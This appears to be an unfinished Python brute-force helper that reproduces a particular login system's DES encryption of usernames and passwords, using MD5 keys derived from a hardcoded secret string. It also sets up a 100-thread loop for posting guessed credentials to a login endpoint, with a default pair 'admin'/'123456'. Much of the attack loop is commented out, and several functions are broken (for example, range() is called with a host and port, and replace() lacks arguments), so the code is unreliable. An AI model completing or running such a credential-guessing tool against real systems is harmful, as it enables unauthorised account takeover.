#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import requests
import string
import hashlib
from base64 import b64encode, b64decode
from Crypto.Cipher import AES
from Crypto.Cipher import DES
from Crypto.Util import number
from Crypto.PublicKey import RSA
import threading
#
def des_encode(ecryptText,key):
    # try:
        key = key[:8]
        print(key)
        # key = bytes(key,'utf-8').hex()
        cipherX = DES.new(key,DES.MODE_ECB)
        pad = 8 - len(ecryptText) % 8
        padStr = ""

        for i in range(pad):
            padStr = padStr + chr(pad)
        ecryptText = ecryptText + padStr
        x = cipherX.encrypt(ecryptText)
        return x.encode('hex_codec')
    # except:
    #     return ""

#
# def des_decode(decryptText,key):
#     try:
#         cipherX = DES.new(key, DES.MODE_ECB)
#         str = decryptText.decode('hex_codec')
#         y = cipherX.decrypt(str)
#         return y[0:ord(y[len(y) - 1]) * -1]
#     except:
#         return ""
# def base64decode(message, altchars=b'+/'):
#     # data = re.sub(rb'[^a-zA-Z0-9%s]+' % altchars, b'', message)  # normalize
#     # missing_padding = len(data) % 4
#     # if missing_padding:
#     #     data += b'=' * (4 - missing_padding)
#
#     return b64decode(message, altchars)
#
def base64encode(message):
    message = bytes(message,'utf-8')
    return b64encode(message)
from Crypto.Cipher import PKCS1_v1_5


def burst(threadId,threadNum,target_host,target_port):
    for i in range(threadId,len(target_port),threadNum):
        range(target_host,target_port[i])


def read_lines(filename):
    with open(filename,'r') as f:
        return [line.strip().rstrip().replace("\r").replace("\n") for line in f.readlines()]

def datadeal(username_list,password_list):
    for username in username_list:
        for password in password_list:
            user_dk = md5('Lube2@I6##2019-04-10')
            pass_dk = md5('Lube2@I6#'+ username + '#2019-04-10')

            print (base64encode(des_encode(username,user_dk)),des_encode(password,pass_dk))

def md5(message):
    obj = hashlib.md5()
    obj.update(message.encode(encoding='utf-8'))
    return obj.hexdigest()

if __name__=='__main__':
    username_txt = ''
    password_txt = ''
    thread_num = 100
    thread_list = []
    headers = {

    }
    data = ''
    login_url = ""
    # username_list = read_lines(username_txt)
    # password_list = read_lines(password_txt)
    username_list = ['admin']
    password_list = ['123456']
    length = len(username_list)*len(username_list)
    print(datadeal(username_list,password_list))
    #
    # for threadId in range(0, length, thread_num):
    #     username,password = datadeal(username_list,password_list)
    #     t = threading.Thread(target=burst, args=(threadId, thread_num, username, password))
    #     t.start()
    #     thread_list.append(t)
    # for num in range(0, thread_num):
    #     thread_list[num].join()
    # res = requests.post(login_url,headers=headers,timeout=3,data = data)
